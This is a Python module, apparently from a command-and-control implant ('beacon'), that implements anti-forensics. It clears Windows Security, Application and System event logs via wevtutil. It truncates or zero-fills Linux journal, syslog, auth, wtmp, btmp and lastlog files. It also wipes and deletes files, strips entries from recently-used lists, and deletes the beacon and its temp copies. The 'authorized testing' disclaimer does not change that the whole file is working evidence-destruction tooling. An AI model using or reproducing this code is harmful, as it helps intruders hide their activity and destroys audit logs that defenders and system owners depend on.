"""Anti-forensics operations for the beacon.

These reduce the on-disk and in-memory footprint the operator's actions leave.
Presented for authorized testing / education. Each function is gated to its OS.
"""
import os
import shutil
import sys
import tempfile
import time


def _is_windows():
    return os.name == "nt"


def flush_system_logs(system="all"):
    """Best-effort flush of common OS logs the beacon may have touched.

    Returns a per-bucket report. On Linux uses systemd-journalctl/log
    truncation where permitted; on Windows clears event logs that a normal
    user can (requires admin for most)."""
    report = []
    if _is_windows():
        # clears the Security/Application/System logs where allowed
        for log in ("Application", "Security", "System"):
            try:
                # wewevtutil requires admin; try and report
                import subprocess
                r = subprocess.run(["wevtutil", "cl", log],
                                   capture_output=True, text=True)
                report.append((log, "ok" if r.returncode == 0 else
                               "denied: " + (r.stderr or "").strip()))
            except Exception as e:
                report.append((log, f"err {e}"))
        return report

    # Linux
    candidates = {
        "journal-global": "/var/log/journal",
        "messages": "/var/log/messages",
        "syslog": "/var/log/syslog",
        "auth": "/var/log/auth.log",
        "btmp": "/var/log/btmp",
        "wtmp": "/var/log/wtmp",
        "lastlog": "/var/log/lastlog",
    }
    for name, path in candidates.items():
        try:
            if not os.path.exists(path):
                continue
            if name == "journal-global":
                for f in _list_dir(path):
                    _wipe_file(f)
                report.append((name, "wiped"))
                continue
            _truncate_or_wipe(path)
            report.append((name, "disabled/truncated"))
        except Exception as e:
            report.append((name, f"err {e}"))
    return report


def _list_dir(d):
    out = []
    for root, _, files in os.walk(d):
        for f in files:
            out.append(os.path.join(root, f))
    return out


def _truncate_or_wipe(path):
    try:
        # try to disable the service/unit first is out of scope here; just
        # truncate to an admin-useful state.
        with open(path, "w") as f:
            f.truncate(0)
    except OSError:
        # fall back to wiping readable copies
        try:
            with open(path, "wb") as f:
                f.write(os.urandom(1))
                f.truncate(0)
        except OSError:
            raise


def _wipe_file(path):
    try:
        with open(path, "r+b") as f:
            length = os.fstat(f.fileno()).st_size
            if length:
                f.seek(0)
                f.write(b"\x00" * length)
                f.flush()
                os.fsync(f.fileno())
    except OSError:
        pass


def wipe_file(path, rounds=1):
    """Overwrite a file with zeros/random then delete it, in-place."""
    for _ in range(max(1, rounds)):
        if not os.path.exists(path):
            continue
        try:
            size = os.path.getsize(path)
            with open(path, "r+b") as f:
                if size:
                    f.seek(0)
                    f.write(b"\x00" * size)
                    f.flush()
                    os.fsync(f.fileno())
        except OSError:
            pass
        time.sleep(0.01)
    try:
        os.unlink(path)
        return True, f"wiped and removed {path}"
    except OSError as e:
        return False, f"remove failed: {e}"


def clear_recent_files(path):
    """Strip a path from the OS MRU / recently-used lists (Linux gtk
    recently-used.xbel; Windows will be a documented no-op)."""
    if _is_windows():
        return True, ("Windows MRU (RecentItems/Recent) is managed per-user; "
                      "no general stdlib API. See docs.")
    # Linux gnome/gtk recently-used list
    targets = [os.path.expanduser("~/.local/share/recently-used.xbel")]
    cleaned = []
    for p in targets:
        if not os.path.exists(p):
            continue
        try:
            with open(p) as f:
                data = f.read()
            if path not in data:
                continue
            data = data.replace(path, "")
            # remove now-empty <bookmark> entries roughly
            with open(p, "w") as f:
                f.write(data)
            cleaned.append(p)
        except Exception:
            pass
    return bool(cleaned), ("removed references from " +
                           (", ".join(cleaned) if cleaned else "nothing"))


def self_destruct(payload_path=None):
    """Remove the beacon file itself and purge temp copies.

    Returns True if the file was removed. The beacon should call sys.exit after.
    """
    removed = []
    if payload_path and os.path.exists(payload_path):
        _wipe_file(payload_path)
        try:
            os.unlink(payload_path)
            removed.append(payload_path)
        except OSError:
            pass
    # also clean our own temp-dir artifacts if we're stored there
    tmp_candidates = []
    for d in ("%TEMP%", "/tmp", tempfile.gettempdir()):
        resolved = os.path.expandvars(d)
        if not os.path.isdir(resolved):
            continue
        prefix = os.path.basename(sys.argv[0]).split(".")[0]
        for fn in os.listdir(resolved):
            if fn.startswith(prefix):
                tmp_candidates.append(os.path.join(resolved, fn))
    for p in tmp_candidates:
        try:
            os.unlink(p)
            removed.append(p)
        except OSError:
            pass
    return removed
